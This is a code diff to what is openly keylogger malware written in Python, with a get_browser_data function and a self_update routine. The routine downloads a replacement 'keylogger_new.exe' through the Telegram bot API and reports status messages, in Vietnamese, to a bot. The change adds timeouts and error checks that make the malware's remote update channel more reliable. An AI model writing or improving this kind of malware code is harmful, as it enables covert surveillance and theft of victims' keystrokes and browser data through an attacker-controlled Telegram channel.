@@ -744,12 +744,22 @@ def get_browser_data():
 def self_update(file_id):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
-        file_path = requests.get(url).json()['result']['file_path']
+        resp_json = requests.get(url, timeout=15).json()
+        if not resp_json.get('ok'):
+            error_desc = resp_json.get('description', 'Unknown API Error')
+            send_telegram_message(f"❌ Lỗi lấy thông tin file từ Telegram: {error_desc}")
+            return
+            
+        file_path = resp_json.get('result', {}).get('file_path')
+        if not file_path:
+            send_telegram_message("❌ Lỗi: Không lấy được file_path từ phản hồi của Telegram.")
+            return
+
         download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
 
         new_exe = "keylogger_new.exe"
         with open(new_exe, "wb") as f:
-            f.write(requests.get(download_url).content)
+            f.write(requests.get(download_url, timeout=30).content)
         
         updater = "updater.bat"
         current_exe = sys.executable
